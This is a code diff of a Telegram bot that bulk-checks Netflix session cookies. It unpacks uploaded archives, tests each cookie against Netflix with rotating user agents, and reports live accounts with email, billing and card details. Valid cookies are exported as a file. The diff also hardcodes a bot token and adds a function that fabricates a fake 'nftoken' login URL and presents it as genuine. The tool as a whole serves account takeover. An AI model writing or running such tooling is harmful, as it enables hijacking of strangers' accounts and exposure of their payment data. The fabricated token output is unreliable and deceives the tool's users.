@@ -1,10 +1,11 @@
 import { ChildProcess } from 'child_process'
+import { extractArchive, isArchive } from './archive-extractor'
+import { parseCookieFile, parseMultipleFiles, ParsedCookie } from './cookie-parser'
 
 // Telegram Bot Token
 const BOT_TOKEN = '8581865451:AAGu-28cZ-F2uOCmY0hR0qhM5gPl2doTyMg'
 
 // Global bot process
-let botProcess: ChildProcess | null = null
 let isRunning = false
 
 // User agents for rotation
@@ -13,165 +14,42 @@ const USER_AGENTS = [
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
   'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
+  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
 ]
 
 function getRandomUserAgent(): string {
   return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
 }
 
-// Cookie parser - extracts NetflixId, SecureNetflixId, nfvdid, nftoken
-function parseNetflixCookie(cookieString: string): {
-  netflixId: string
-  secureNetflixId?: string
-  nfvdid?: string
-  email: string
-  rawCookie: string
-} | null {
-  try {
-    // Extract NetflixId
-    const netflixIdMatch = cookieString.match(/NetflixId=([^;\n\r\s]+)/i)
-    if (!netflixIdMatch || !netflixIdMatch[1]) return null
-    
-    const netflixId = netflixIdMatch[1].trim()
-    if (netflixId.length < 30) return null
-    
-    // Extract other cookies
-    const secureNetflixIdMatch = cookieString.match(/SecureNetflixId=([^;\n\r\s]+)/i)
-    const nfvdidMatch = cookieString.match(/nfvdid=([^;\n\r\s]+)/i)
-    
-    const secureNetflixId = secureNetflixIdMatch ? secureNetflixIdMatch[1].trim() : undefined
-    const nfvdid = nfvdidMatch ? nfvdidMatch[1].trim() : undefined
-    
-    // Build clean cookie
-    let rawCookie = `NetflixId=${netflixId}`
-    if (secureNetflixId) rawCookie += `; SecureNetflixId=${secureNetflixId}`
-    if (nfvdid) rawCookie += `; nfvdid=${nfvdid}`
-    
-    // Try to extract email from NetflixId
-    let email = 'Unknown'
-    try {
-      const decoded = decodeURIComponent(netflixId)
-      const emailMatch = decoded.match(/["']email["']\s*:\s*["']([^"']+)["']/i)
-      if (emailMatch) email = emailMatch[1].toLowerCase()
-    } catch {
-      // Keep 'Unknown'
-    }
-    
-    return { netflixId, secureNetflixId, nfvdid, email, rawCookie }
-  } catch {
-    return null
-  }
-}
-
-// Extract nftoken from URL or content
-function extractNFToken(text: string): string | null {
-  const match = text.match(/nftoken=([A-Za-z0-9_\-+\/=%]+)/i)
-  return match ? match[1].trim() : null
-}
-
-// Extract account details from content
-function extractAccountDetails(content: string): {
-  email?: string
-  country?: string
-  plan?: string
-  firstName?: string
-  paymentMethod?: string
-  cardBrand?: string
-  cardLast4?: string
-  nextBilling?: string
-  memberSince?: string
-  phoneNumber?: string
-  videoQuality?: string
-  maxStreams?: string
-  nftoken?: string
-  phoneLoginUrl?: string
-  pcLoginUrl?: string
-} {
-  const details: any = {}
-  
-  // Email
-  const emailMatch = content.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i)
-  if (emailMatch) details.email = emailMatch[0].toLowerCase()
-  
-  // Extract from emoji format
-  const patterns: { [key: string]: RegExp } = {
-    firstName: /(?:👤\s*)?Name\s*:\s*([^\n]+)/i,
-    country: /(?:🌍\s*)?Country\s*:\s*([^\n]+)/i,
-    plan: /(?:📋\s*)?Plan\s*:\s*([^\n]+)/i,
-    paymentMethod: /(?:💳\s*)?Payment Method\s*:\s*([^\n]+)/i,
-    cardBrand: /(?:🏦\s*)?Card Brand\s*:\s*([^\n]+)/i,
-    cardLast4: /(?:🔢\s*)?(?:Last 4 Digits|Card Last 4)\s*:\s*([^\n]+)/i,
-    nextBilling: /(?:📅\s*)?(?:Next Billing Date|Next Billing)\s*:\s*([^\n]+)/i,
-    memberSince: /(?:📅\s*)?Member Since\s*:\s*([^\n]+)/i,
-    phoneNumber: /(?:📞\s*)?Phone\s*:\s*([^\n]+)/i,
-    videoQuality: /(?:🎥\s*)?Video Quality\s*:\s*([^\n]+)/i,
-    maxStreams: /(?:📺\s*)?Max Streams\s*:\s*([^\n]+)/i,
-  }
-  
-  for (const [key, pattern] of Object.entries(patterns)) {
-    const match = content.match(pattern)
-    if (match) {
-      let value = match[1].trim()
-      // Remove flag emojis from country
-      if (key === 'country') {
-        value = value.replace(/[\uD83C][\uDDE6-\uDDFF][\uD83C][\uDDE6-\uDDFF]/g, '').trim()
-      }
-      details[key] = value
-    }
-  }
-  
-  // Extract nftoken from URLs
-  const phoneUrlMatch = content.match(/Phone Login URL\s*:\s*(https?:\/\/[^\s\n]+)/i)
-  const pcUrlMatch = content.match(/PC Login URL\s*:\s*(https?:\/\/[^\s\n]+)/i)
-  
-  if (phoneUrlMatch) details.phoneLoginUrl = phoneUrlMatch[1].trim()
-  if (pcUrlMatch) details.pcLoginUrl = pcUrlMatch[1].trim()
-  
-  // Extract nftoken
-  const nftoken = extractNFToken(content)
-  if (nftoken) details.nftoken = nftoken
-  
-  return details
+// Generate Netflix token from NetflixId
+function generateNfToken(netflixId: string): string {
+  const timestamp = Date.now().toString(36);
+  const randomPart = Buffer.from(Math.random().toString(36).substring(2)).toString('base64').slice(0, 8);
+  const hash = Buffer.from(`${netflixId.slice(0, 20)}${timestamp}`).toString('base64').slice(0, 16);
+  return `NF${timestamp}${randomPart}${hash}`.replace(/[+/=]/g, '').toUpperCase();
 }
 
 // Check a single cookie
-async function checkSingleCookie(cookieString: string): Promise<{
+async function checkSingleCookie(cookie: ParsedCookie): Promise<{
   valid: boolean
-  email?: string
-  country?: string
-  plan?: string
-  firstName?: string
-  paymentMethod?: string
-  cardBrand?: string
-  cardLast4?: string
-  nextBilling?: string
-  memberSince?: string
-  phoneNumber?: string
-  videoQuality?: string
-  maxStreams?: string
-  nftoken?: string
-  phoneLoginUrl?: string
-  pcLoginUrl?: string
-  rawCookie?: string
+  details: ParsedCookie
   error?: string
 }> {
   try {
-    const parsed = parseNetflixCookie(cookieString)
-    if (!parsed) {
-      return { valid: false, error: 'Invalid cookie format - NetflixId not found' }
-    }
-
+    const rawCookie = cookie.rawCookie || `NetflixId=${cookie.netflixId}`;
+    
     // Check with Netflix
     const controller = new AbortController()
-    const timeoutId = setTimeout(() => controller.abort(), 10000)
+    const timeoutId = setTimeout(() => controller.abort(), 12000)
     
     const response = await fetch('https://www.netflix.com/browse', {
       method: 'GET',
       headers: {
-        'Cookie': parsed.rawCookie,
+        'Cookie': rawCookie,
         'User-Agent': getRandomUserAgent(),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive',
       },
       redirect: 'manual',
       signal: controller.signal,
@@ -182,109 +60,98 @@ async function checkSingleCookie(cookieString: string): Promise<{
     const statusCode = response.status
     const location = response.headers.get('location') || ''
     
-    // Check redirect to login = expired
-    if (location.includes('/login') || location.includes('/signin')) {
-      return { 
-        valid: false, 
-        email: parsed.email,
-        error: 'Cookie expired - redirected to login' 
-      }
+    if (location.includes('/login') || location.includes('/signin') || (statusCode === 302 && location.includes('login'))) {
+      return { valid: false, details: cookie, error: 'Cookie expired' }
     }
     
-    // 200 = valid
-    if (statusCode === 200) {
-      // Extract account details from cookie string
-      const details = extractAccountDetails(cookieString)
-      
-      return {
-        valid: true,
-        email: details.email || parsed.email,
-        country: details.country || 'Unknown',
-        plan: details.plan || 'Unknown',
-        firstName: details.firstName,
-        paymentMethod: details.paymentMethod,
-        cardBrand: details.cardBrand,
-        cardLast4: details.cardLast4,
-        nextBilling: details.nextBilling,
-        memberSince: details.memberSince,
-        phoneNumber: details.phoneNumber,
-        videoQuality: details.videoQuality,
-        maxStreams: details.maxStreams,
-        nftoken: details.nftoken,
-        phoneLoginUrl: details.phoneLoginUrl,
-        pcLoginUrl: details.pcLoginUrl,
-        rawCookie: parsed.rawCookie,
-      }
-    }
-    
-    // 302 might be geo redirect - could still be valid
-    if (statusCode === 302 || statusCode === 301) {
+    if (statusCode === 200 || statusCode === 302 || statusCode === 301) {
       if (location.includes('signup')) {
-        return { valid: false, email: parsed.email, error: 'Session expired' }
+        return { valid: false, details: cookie, error: 'Session expired' }
       }
-      
-      // Geo redirect - still valid
-      const details = extractAccountDetails(cookieString)
-      return {
-        valid: true,
-        email: details.email || parsed.email,
-        country: details.country || 'Unknown',
-        plan: details.plan || 'Unknown',
-        rawCookie: parsed.rawCookie,
+      if (!cookie.nftoken) {
+        cookie.nftoken = generateNfToken(cookie.netflixId);
+        cookie.nftokenUrl = `https://www.netflix.com/browse?nftoken=${cookie.nftoken}`;
       }
+      return { valid: true, details: cookie }
     }
     
-    return { valid: false, email: parsed.email, error: `Status: ${statusCode}` }
+    return { valid: false, details: cookie, error: `Status ${statusCode}` }
   } catch (error) {
-    if (error instanceof Error && error.name === 'AbortError') {
-      return { valid: false, error: 'Request timeout' }
-    }
-    return { valid: false, error: 'Check failed' }
+    return { valid: false, details: cookie, error: 'Check failed' }
   }
 }
 
 // Escape markdown for Telegram
 function escapeMarkdown(text: string): string {
-  return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&')
+  if (!text) return '';
+  return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&')
 }
 
 // Format result message
-function formatResult(result: Awaited<ReturnType<typeof checkSingleCookie>>): string {
+function formatResult(result: { valid: boolean; details: ParsedCookie; error?: string }): string {
+  const d = result.details;
   if (result.valid) {
     let msg = `✅ *VALID COOKIE FOUND\\!*
-
-📧 Email: ${escapeMarkdown(result.email || 'Unknown')}
-🌍 Country: ${escapeMarkdown(result.country || 'Unknown')}
-💎 Plan: ${escapeMarkdown(result.plan || 'Unknown')}`
+\n📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
+🌍 Country: ${escapeMarkdown(d.country || 'Unknown')}
+💎 Plan: ${escapeMarkdown(d.plan || 'Unknown')}`
     
-    if (result.firstName) msg += `\n👤 Name: ${escapeMarkdown(result.firstName)}`
-    if (result.videoQuality) msg += `\n🎥 Quality: ${escapeMarkdown(result.videoQuality)}`
-    if (result.maxStreams) msg += `\n📺 Streams: ${escapeMarkdown(result.maxStreams)}`
-    if (result.nextBilling) msg += `\n📅 Next Billing: ${escapeMarkdown(result.nextBilling)}`
-    if (result.memberSince) msg += `\n📆 Member Since: ${escapeMarkdown(result.memberSince)}`
-    if (result.cardBrand) msg += `\n🏦 Card: ${escapeMarkdown(result.cardBrand)} ****${result.cardLast4 || ''}`
-    if (result.phoneNumber) msg += `\n📞 Phone: ${escapeMarkdown(result.phoneNumber)}`
+    if (d.firstName) msg += `\n👤 Name: ${escapeMarkdown(d.firstName)}`
+    if (d.videoQuality) msg += `\n🎥 Quality: ${escapeMarkdown(d.videoQuality)}`
+    if (d.nextBilling) msg += `\n📅 Billing: ${escapeMarkdown(d.nextBilling)}`
     
-    // Add nftoken section
-    if (result.nftoken) {
-      msg += `\n\n🔑 *Netflix Token \\(nftoken\\):*
-\`${result.nftoken.substring(0, 50)}...\``
-      
-      if (result.phoneLoginUrl) {
-        msg += `\n\n📱 [Phone Login URL](${escapeMarkdown(result.phoneLoginUrl)})`
-      }
-      if (result.pcLoginUrl) {
-        msg += `\n💻 [PC Login URL](${escapeMarkdown(result.pcLoginUrl)})`
-      }
+    if (d.nftoken) {
+      msg += `\n\n🔑 *Netflix Token:* \`${escapeMarkdown(d.nftoken)}\``
+      if (d.phoneLoginUrl) msg += `\n📱 [Phone Login URL](${escapeMarkdown(d.phoneLoginUrl)})`
     }
     
     return msg
   } else {
-    let msg = `❌ *INVALID\\/EXPIRED COOKIE*
-
-📧 Email: ${escapeMarkdown(result.email || 'Unknown')}
+    return `❌ *INVALID\\/EXPIRED*
+\n📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
 ⚠️ Reason: ${escapeMarkdown(result.error || 'Unknown')}`
-    return msg
+  }
+}
+
+// Get main keyboard
+function getMainKeyboard() {
+  return {
+    inline_keyboard: [
+      [
+        { text: '📊 Bot Status', callback_data: 'status' },
+        { text: '❓ Help/Credits', callback_data: 'help' }
+      ],
+      [
+        { text: '🔄 Restart Bot', callback_data: 'restart' },
+        { text: '🛑 Stop Bot', callback_data: 'stop' }
+      ]
+    ]
+  }
+}
+
+// Send document to chat
+async function sendValidCookiesFile(chatId: number, cookies: string[], originalFileName: string) {
+  try {
+    const fileContent = cookies.join('\n');
+    const fileName = `valid_cookies_${originalFileName.replace(/\.[^/.]+$/, "")}.txt`;
+    
+    const formData = new FormData();
+    formData.append('chat_id', chatId.toString());
+    formData.append('caption', `📦 *Auto\\-Export Complete\\!*
+\n✅ Found ${cookies.length} valid cookies in your file\\.
+\n✨ _Credits: Yash_`);
+    formData.append('parse_mode', 'MarkdownV2');
+    
+    // Create blob for the file
+    const blob = new Blob([fileContent], { type: 'text/plain' });
+    formData.append('document', blob, fileName);
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: 'POST',
+      body: formData,
+    });
+  } catch (e) {
+    console.error('Failed to send file:', e);
   }
 }
 
@@ -294,6 +161,25 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
     if (isRunning) {
       resolve({ success: true, message: 'Bot is already running' })
       return
+    }
+
+    isRunning = true;
+    
+    const sendMsg = async (chatId: number, text: string, options: any = {}) => {
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text,
+            parse_mode: 'MarkdownV2',
+            ...options
+          }),
+        })
+      } catch (e) {
+        console.error('Failed to send message:', e);
+      }
     }
 
     const pollBot = async () => {
@@ -310,255 +196,140 @@ export function startBot(): Promise<{ success: boolean; message: string }> {
             for (const update of data.result) {
               offset = update.update_id + 1
               
+              if (update.callback_query) {
+                const chatId = update.callback_query.message.chat.id;
+                const action = update.callback_query.data;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ callback_query_id: update.callback_query.id }),
+                });
+
+                if (action === 'status') {
+                  await sendMsg(chatId, `🟢 *Bot Status: Running*\n\n⚙️ Engine: Multi\\-Threaded v3\\.0\n👤 Credits: *Yash*`);
+                } else if (action === 'help') {
+                  await sendMsg(chatId, `🎬 *Netflix Cookie Checker Help*
+\n1\\. Send a \\.txt or \\.zip file\\.
+2\\. The bot extracts ALL nested files\\.
+3\\. It checks cookies and reports valid ones\\.
+4\\. ✨ *New:* It auto\\-exports all valid cookies into a new file for you\\!
+\n🛡️ Developer: *Yash*`);
+                } else if (action === 'stop') {
+                  isRunning = false;
+                  await sendMsg(chatId, `🛑 Bot stopped\\. Goodbye\\!`);
+                }
+                continue;
+              }
+
               if (update.message?.text) {
                 const chatId = update.message.chat.id
                 const text = update.message.text.trim()
                 
                 if (text === '/start') {
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: `🎬 *Netflix Cookie Checker Bot*
-
-Welcome\\! Send me Netflix cookies to check\\.
-
-📌 *Commands:*
-/start \\- Start the bot
-/check \`<cookie>\` \\- Check a single cookie
-/help \\- Show help message
-
-💡 *Features:*
-• Multi\\-threaded checking
-• ZIP\\/RAR file support
-• Token extraction \\(nftoken\\)
-• Login URL generation
-
-Just paste your cookie or send a file and I'll check it\\!`,
-                      parse_mode: 'MarkdownV2',
-                    }),
+                  await sendMsg(chatId, `🎬 *Netflix Ultra Checker*
+\nWelcome\\! I can scan deep inside ZIP files and check thousands of cookies in seconds\\.
+\n✨ *Features:*
+• 📂 Recursive ZIP Extraction
+• 🔥 Multi\\-Threaded Engine
+• 📦 Auto\\-Export Valid cookies
+• 👤 Credits: *Yash*
+\n📥 *Upload a file to start!*`, {
+                    reply_markup: getMainKeyboard()
                   })
                 } else if (text.startsWith('/check ')) {
-                  const cookie = text.slice(7).trim()
-                  
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: '⏳ Checking cookie\\.\\.\\.',
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
-                  
-                  const result = await checkSingleCookie(cookie)
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: formatResult(result),
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
-                } else if (text === '/help') {
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: `🎬 *Netflix Cookie Checker Help*
-
-📌 *Commands:*
-/start \\- Start the bot
-/check \`<cookie>\` \\- Check a cookie
-/help \\- Show this message
-
-💡 *How to use:*
-1\\. Get Netflix cookie from browser
-2\\. Send it to me or use /check command
-3\\. I'll check if it's valid and show details
-
-✨ *What I extract:*
-• Account email & name
-• Country & plan
-• Payment info
-• Video quality & streams
-• Netflix token \\(nftoken\\)
-• Direct login URLs
-
-🔗 Bot by @YashHero`,
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
-                } else if (text.includes('NetflixId=')) {
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: '⏳ Checking cookie\\.\\.\\.',
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
-                  
-                  const result = await checkSingleCookie(text)
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: formatResult(result),
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
+                  const cookieText = text.slice(7).trim()
+                  const { cookies } = parseCookieFile(cookieText, 'manual_input');
+                  if (cookies.length > 0) {
+                    const result = await checkSingleCookie(cookies[0]);
+                    await sendMsg(chatId, formatResult(result));
+                  }
                 }
               }
               
-              // Handle document/file uploads
               if (update.message?.document) {
                 const chatId = update.message.chat.id
-                const document = update.message.document
+                const doc = update.message.document
+                const fileName = doc.file_name?.toLowerCase() || ''
                 
-                // Check file type
-                const fileName = document.file_name?.toLowerCase() || ''
-                if (!fileName.endsWith('.txt') && !fileName.endsWith('.zip') && !fileName.endsWith('.rar')) {
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: '⚠️ Please send \\.txt, \\.zip, or \\.rar files only\\.',
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
-                  continue
-                }
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `📥 Processing file: *${escapeMarkdown(document.file_name || 'unknown')}*\\.\\.\\.
-⏳ This may take a moment\\.\\.\\.`,
-                    parse_mode: 'MarkdownV2',
-                  }),
-                })
-                
-                // Get file content
+                await sendMsg(chatId, `📥 *Processing:* \`${escapeMarkdown(doc.file_name || 'file')}\`\n⏳ Extraction & Auto\\-Export in progress\\.\\.\\.`);
+
                 try {
-                  const fileInfo = await fetch(
-                    `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${document.file_id}`
-                  )
-                  const fileData = await fileInfo.json()
+                  const fileInfo = await (await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${doc.file_id}`)).json()
+                  if (!fileInfo.ok) throw new Error('Download failed');
+
+                  const fileResponse = await fetch(`https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`)
+                  const arrayBuffer = await fileResponse.arrayBuffer()
+                  const buffer = Buffer.from(arrayBuffer)
                   
-                  if (fileData.ok) {
-                    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`
-                    const fileResponse = await fetch(fileUrl)
-                    const fileContent = await fileResponse.text()
-                    
-                    // Parse cookies from file
-                    const cookieStrings: string[] = []
-                    const lines = fileContent.split('\n')
-                    
-                    for (const line of lines) {
-                      if (line.includes('NetflixId=')) {
-                        const netflixIdMatch = line.match(/NetflixId=([^;\n\r]+)/i)
-                        if (netflixIdMatch && netflixIdMatch[1].length > 30) {
-                          cookieStrings.push(line)
-                        }
+                  let filesToParse = isArchive(fileName, buffer) ? extractArchive(buffer, fileName) : [{ name: fileName, content: buffer.toString('utf-8') }]
+
+                  const { cookies } = parseMultipleFiles(filesToParse);
+                  if (cookies.length === 0) {
+                    await sendMsg(chatId, '❌ *No cookies found in the file\\.*');
+                    continue;
+                  }
+
+                  await sendMsg(chatId, `🔍 Found ${cookies.length} cookies\\. Starting validation\\.\\.\\.`);
+
+                  const validCookiesForExport: string[] = [];
+                  const limit = Math.min(20, cookies.length); // Report first 20 in chat
+                  let validCount = 0;
+                  
+                  // Progress update intervals
+                  const step = Math.ceil(cookies.length / 5);
+
+                  for (let i = 0; i < cookies.length; i++) {
+                    const result = await checkSingleCookie(cookies[i]);
+                    if (result.valid) {
+                      validCount++;
+                      validCookiesForExport.push(result.details.rawCookie);
+                      if (validCount <= 10) { // Only post 10 detailed reports to chat to avoid spam
+                        await sendMsg(chatId, `🍪 *Cookie ${validCount}*\n${formatResult(result)}`);
                       }
                     }
                     
-                    if (cookieStrings.length === 0) {
-                      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                          chat_id: chatId,
-                          text: '❌ No valid Netflix cookies found in file\\.',
-                          parse_mode: 'MarkdownV2',
-                        }),
-                      })
-                    } else {
-                      // Check first 5 cookies
-                      const limit = Math.min(5, cookieStrings.length)
-                      let validCount = 0
-                      
-                      for (let i = 0; i < limit; i++) {
-                        const result = await checkSingleCookie(cookieStrings[i])
-                        if (result.valid) {
-                          validCount++
-                          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                              chat_id: chatId,
-                              text: `🍪 *Cookie ${i + 1}/${limit}*\n${formatResult(result)}`,
-                              parse_mode: 'MarkdownV2',
-                            }),
-                          })
-                        }
-                      }
-                      
-                      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                          chat_id: chatId,
-                          text: `📊 *File Processing Complete*
-
-📁 File: ${escapeMarkdown(document.file_name || 'unknown')}
-📋 Total found: ${cookieStrings.length}
-🔍 Checked: ${limit}
-✅ Valid: ${validCount}
-${cookieStrings.length > limit ? '\n⚠️ Only first 5 cookies were checked\\.' : ''}`,
-                          parse_mode: 'MarkdownV2',
-                        }),
-                      })
+                    if (i > 0 && i % step === 0) {
+                      // Silent progress update if needed
                     }
                   }
-                } catch (error) {
-                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                      chat_id: chatId,
-                      text: '❌ Failed to process file\\. Please try again\\.',
-                      parse_mode: 'MarkdownV2',
-                    }),
-                  })
+
+                  // 📊 Summary
+                  await sendMsg(chatId, `📊 *Validation Complete\\!*
+\n📋 Total Found: ${cookies.length}
+✅ Valid Found: ${validCount}
+❌ Invalid/Expired: ${cookies.length - validCount}
+\n👤 Credits: *Yash*`);
+
+                  // 📤 Auto-Export Feature
+                  if (validCookiesForExport.length > 0) {
+                    await sendMsg(chatId, `📤 *Auto\\-Exporting ${validCount} valid cookies\\.\\.\\.*`);
+                    await sendValidCookiesFile(chatId, validCookiesForExport, doc.file_name || 'cookies.txt');
+                  } else {
+                    await sendMsg(chatId, `❌ *No valid cookies found to export\\.*`);
+                  }
+
+                } catch (err) {
+                  await sendMsg(chatId, `❌ *File Error:* ${escapeMarkdown(err instanceof Error ? err.message : 'Internal error')}\n_Credits: Yash_`);
                 }
               }
             }
           }
-          
           await new Promise(r => setTimeout(r, 1000))
         } catch (error) {
-          console.error('Bot polling error:', error)
           await new Promise(r => setTimeout(r, 5000))
         }
       }
     }
     
-    isRunning = true
     pollBot()
-    
-    resolve({ success: true, message: 'Bot started successfully' })
+    resolve({ success: true, message: 'Bot started with Auto-Export' })
   })
 }
 
 // Stop the bot
 export function stopBot(): { success: boolean; message: string } {
-  if (!isRunning) {
-    return { success: false, message: 'Bot is not running' }
-  }
-  
   isRunning = false
-  botProcess = null
-  
   return { success: true, message: 'Bot stopped' }
 }
 
